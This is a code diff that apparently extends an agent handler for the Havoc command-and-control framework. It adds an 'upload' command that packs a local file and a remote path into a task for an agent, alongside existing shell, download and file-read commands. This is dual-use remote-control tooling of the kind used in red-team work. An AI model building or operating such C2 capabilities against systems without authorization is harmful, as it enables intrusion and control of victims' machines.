@@ -1,3 +1,4 @@
+import base64
 from havoc.service import HavocService
 from havoc.agent import *
 
@@ -7,6 +8,7 @@ COMMAND_CAT_FILE = 0x156
 COMMAND_SHELL = 0x152
 COMMAND_SHELL_SCRIPT = 0x151
 COMMAND_DOWNLOAD = 0x153
+COMMAND_UPLOAD = 0x154
 
 
 class CommandShellScript(Command):
@@ -94,4 +96,34 @@ class CommandDownload(Command):
         Task = Packer()
         Task.add_int(COMMAND_DOWNLOAD)
         Task.add_data(arguments['file_path'])
+        return Task.buffer
+
+class CommandUpload(Command):
+    CommandId = COMMAND_UPLOAD
+    Name = "upload"
+    Description = "tells the agent to upload file"
+    Help = "upload /local/path/to/file /remote/path/to/file"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+        name="local_file",
+        is_file_path=True,
+        is_optional=False
+        ),
+        CommandParam(
+        name="remote_file_path",
+        is_file_path=False,
+        is_optional=False
+        )]
+
+    def job_generate(self, arguments: dict) -> bytes:
+      
+        Task = Packer()
+        Task.add_int(COMMAND_UPLOAD)     
+
+        Task.add_int(len(arguments['remote_file_path']))
+        Task.add_data(arguments['remote_file_path'])
+        Task.add_data(arguments['local_file'])
+
         return Task.buffer
